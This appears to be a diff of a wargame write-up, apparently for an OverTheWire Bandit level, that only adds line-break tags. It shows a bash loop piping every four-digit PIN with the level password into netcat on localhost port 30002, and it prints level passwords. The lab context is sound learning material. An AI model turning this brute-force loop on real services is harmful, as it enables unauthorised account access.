@@ -8,13 +8,13 @@ Pass: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ<br>
 In this chall, we learn how to bruteforce. You can reference here: [BruteForce from OWASP](https://owasp.org/www-community/attacks/Brute_force_attack) <br>
 ### Solution:<br>
 - We have no command suggested here. It means we have to write a **bash script** again. With the description above, i just need to pass a string which combines of current 
-password and a **PIN** code (which have to bruteforce). So here is my script:
-`#! /bin/bash`
-`for i in {0000..9999}`
-`do`
-`    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"`
-`done | nc localhost 30002`
-**Note**: Remember to put the `| nc localhost 30002` command after looping. Let the loop output **pipeline** through into netcat.  
+password and a **PIN** code (which have to bruteforce). So here is my script:<br>
+`#! /bin/bash`<br>
+`for i in {0000..9999}`<br>
+`do`<br>
+`    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"`<br>
+`done | nc localhost 30002`<br>
+**Note**: Remember to put the `| nc localhost 30002` command after looping. Let the loop output **pipeline** through into netcat.  <br>
 #### Password for next level: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG 
 
 
